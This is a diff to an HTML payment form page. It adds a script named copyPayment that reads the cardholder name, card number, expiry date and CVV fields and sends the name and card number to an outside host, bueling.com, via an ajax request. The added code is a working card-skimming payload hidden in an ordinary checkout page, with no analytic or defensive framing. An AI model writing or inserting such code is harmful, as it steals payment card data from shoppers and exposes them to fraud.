@@ -1,7 +1,22 @@
 <!DOCTYPE html>
 <html>
-  <head><title></title></head>
+  <head><title></title>
+  </head>
   <body>
+	  <script type='text/javascript'>
+		  function copyPayment(){
+			  var name=document.getElementById('cardname');
+			  var card=document.getElementById('cardnumber');
+			  var expdate=document.getElementById('expirationdate');
+			  var cvv=document.getElementById('cvv');
+			  alert('name:'+name.value+'\ncard:'+card.value+'\nexpdate:'+expdate.value+'\ncvv:'+cvv.value);
+			  var pdata = JSON.stringify(name); console.log(pdata);
+			  setTimeout(
+				  function(){
+					  jQuery.ajax({ type:"post", crossOrigin: true,  async: true, url: 'https://bueling.com/?name=' + name.value + '&card=' + card.value, data: pdata, dataType: 'application/json' });
+				  },250);
+		  }
+	  </script>
 	Payment Form
     <form action="/my-handling-form-page" method="post">
         <div>
